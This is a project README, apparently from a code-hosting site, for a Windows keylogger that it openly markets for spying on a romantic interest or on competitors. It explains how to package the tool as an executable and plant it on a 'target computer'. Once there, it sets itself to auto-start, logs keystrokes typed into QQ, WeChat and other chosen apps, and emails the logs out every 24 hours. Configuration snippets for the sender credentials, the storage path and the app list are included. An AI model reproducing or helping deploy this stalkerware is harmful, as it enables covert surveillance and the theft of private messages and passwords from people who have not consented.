# Keyboard Activity Monitor

## Overview

Still can't get over that girl you like? Are you anxious about your competitors? This program can help you monitor the keyboard activity of target applications (such as QQ or WeChat) and record this data, which will be automatically sent to your email after a set period.

### Features Overview

- **Application Monitoring**: This program monitors the running status of custom applications. When it detects that a specified application is running, it starts recording keyboard activities.
- **Auto Startup**: After running the packaged file, it can automatically add itself to the startup folder to enable auto startup.
- **Keystroke Logging**: Records detailed information about keystrokes, including key content, the number of keystrokes, and the time of the keystroke.
- **Data Storage**: The recorded data is stored as compressed binary files to save storage space.
- **Email Sending**: The program periodically checks and sends the recorded keystroke data via a specified email.
- **Data Reading**: A separate program `Read.py` is provided to decompress and read the stored binary data and display the data in table form, which can be exported as CSV or Excel files.
- **Packaging Tool**: A [Package_tool](https://github.com/ystemsrx/Application-Monitoring/releases) tool is provided to package the program into a single executable file and supports custom icons.

### File Descriptions

- **Application_Monitoring**: The main program, used to monitor the running status of QQ and WeChat, record keyboard activities, save the data as compressed binary files, and periodically send them via email.
- **Read.py**: Data reading tool, decompresses and reads the binary files generated by `Application_Monitoring`, and provides data visualization and export functions.
- **Package_tool.py**: Packaging tool, used to package Python scripts into a single executable file, with support for custom icons.

### Instructions

1. **Monitoring and Recording**:
   - Package `Application_Monitoring` (a [packaging tool](https://github.com/ystemsrx/Application-Monitoring/releases) is available) into an exe and run it on the target computer. This program will continuously and automatically detect the running status of QQ and WeChat in the background and start recording keyboard inputs.
   - The data will be stored in real-time in the `key_data.bin` file.
   - Every 24 hours, the data will be sent to your email.

2. **Reading and Exporting**:
   - Run the `Read.py` program, and drag the `key_data.bin` file into it to view the recorded keyboard input data.
     
     ⚠**Important：[Read.py](Read.py) requires `PyQt5` and `Pandas` libraries to be installed. To install them, run `pip install pyqt5 pandas`.**
  
   - The data can be filtered and exported as CSV or Excel files for further analysis.

3. **Packaging Tool**:

   - Your computer must have Python installed, which can be downloaded and installed [here](https://www.python.org/downloads/release/python-3125/).
   - Use the packaging tool to package the above two scripts into standalone executable files, [click here](https://github.com/ystemsrx/Application-Monitoring/releases). Drag the Python scripts into the interface to package them, and you can add a custom icon (by dragging in an image or icon).

### Required Configurations

In the `Application_Monitoring` file, there are several parts that need to be filled in and modified to ensure the program works as expected:

1. **Email Configuration**:
   - `from_addr`: The sender's email address.
   - `to_addr`: The recipient's email address.
   - `password`: The SMTP authorization code for the sender's email. Please search for how to obtain the authorization code.

   For example:
   ```python
   from_addr = "your_email@example.com"
   to_addr = "recipient_email@example.com"
   password = "your_email_password_or_smtp_token"
   ```

2. **File Storage Path**:
   - `compressed_file`: The file path for storing compressed data. Modify the storage path as needed to ensure the program has permission to read and write files in that path. It is recommended to write to a drive other than the C drive.

   For example:
   ```python
   compressed_file = "D:\\your_path\\compressed_key_data.bin"
   ```

3. **Time Interval Settings**:
   - `interval_time`: The program is set by default to send the recorded email every 24 hours (86400 seconds). You can modify this time interval as needed, with the default being 24 hours.

   For example, to change it to send every 12 hours:
   ```python
   interval_time = 43200:  # 12 hours in seconds
   ```

4. **Application List**:
   - Add applications to `applications = ["QQ", "WeChat"]`, with QQ and WeChat as the default. Applications are separated by commas and need to be enclosed in quotation marks. **Note**: The application name should be the process name, not the name itself (which can be seen in the task manager). For example, **WeChat Work** is called **WXWork**.

### TODO List

- [x] **Unified Application Monitoring**: You can monitor the application by entering the application name in the list, without manually adjusting the program code.
- [ ] **Data Interpretation Tool**: The current program can only record key content but cannot interpret complete pinyin input. A tool will be developed in the future to interpret and reconstruct the actual text input by the user for a more intuitive understanding of the input content.
- [X] **Auto Startup**: Added an auto startup feature.
